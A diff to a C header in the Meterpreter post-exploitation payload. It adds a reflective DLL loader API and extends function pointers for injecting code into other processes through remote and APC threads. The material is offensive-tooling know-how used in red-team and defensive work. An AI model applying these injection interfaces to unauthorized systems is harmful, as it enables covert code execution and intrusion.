@@ -4,15 +4,19 @@
  */
 #ifndef _METERPRETER_COMMON_METAPI_H
 #define _METERPRETER_COMMON_METAPI_H
-
 #include "common_winapi.h"
 
+typedef struct _ReflectiveLoaderApi
+{
+	HANDLE (WINAPI *LoadRemoteLibraryR)(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPCSTR cpReflectiveLoaderName, DWORD dwActualReflectiveLoaderOffset, LPVOID lpParameter);
+} ReflectiveLoaderApi;
 typedef struct _InjectApi
 {
-	DWORD(*dll)(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, LPVOID lpArg, SIZE_T stArgSize);
+	DWORD(*dll)(DWORD dwPid, DWORD dwDestinationArch, LPVOID lpDllBuffer, DWORD dwDllLength, LPCSTR reflectiveLoader, DWORD dwActualReflectiveLoaderOffset, LPVOID lpArg, SIZE_T stArgSize);
 	DWORD(*via_apcthread)(Remote* remote, Packet* response, HANDLE hProcess, DWORD dwProcessID, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter);
 	DWORD(*via_remotethread)(Remote* remote, Packet* response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter);
 	DWORD(*via_remotethread_wow64)(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, HANDLE* pThread);
+	ReflectiveLoaderApi reflective_loader;
 } InjectApi;
 
 typedef struct _ChannelApi
